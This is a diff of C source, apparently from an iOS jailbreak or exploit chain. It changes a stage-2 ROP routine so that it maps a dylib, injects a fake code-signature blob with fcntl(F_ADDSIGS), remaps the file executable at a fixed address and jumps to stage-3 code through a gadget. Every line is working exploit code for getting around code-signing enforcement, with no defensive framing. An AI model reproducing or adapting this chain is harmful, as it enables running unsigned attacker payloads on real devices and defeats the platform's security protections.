@@ -664,10 +664,24 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("dylib_str",1);
 	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
-	// map it at a fixed address
+	// add codesignature to the vnode
+	// mmap the blob
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG64("dylib_fd",5);
-	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_SHARED,0,offsets->stage3_fileoffset,0,0);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
+	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
+	memset(siginfo,0,sizeof(fsignatures_t));
+	siginfo->fs_blob_start = offsets->stage3_CS_blob;
+	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
+	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG64("dylib_fd",1);
+	ROP_VAR_ARG("siginfo",3);
+	CALL("fcntl",0,F_ADDSIGS,0,0,0,0,0,0);
+	// map it at a fixed address (this will smash the blob)
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG64("dylib_fd",5);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
 	// jump
 	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
 
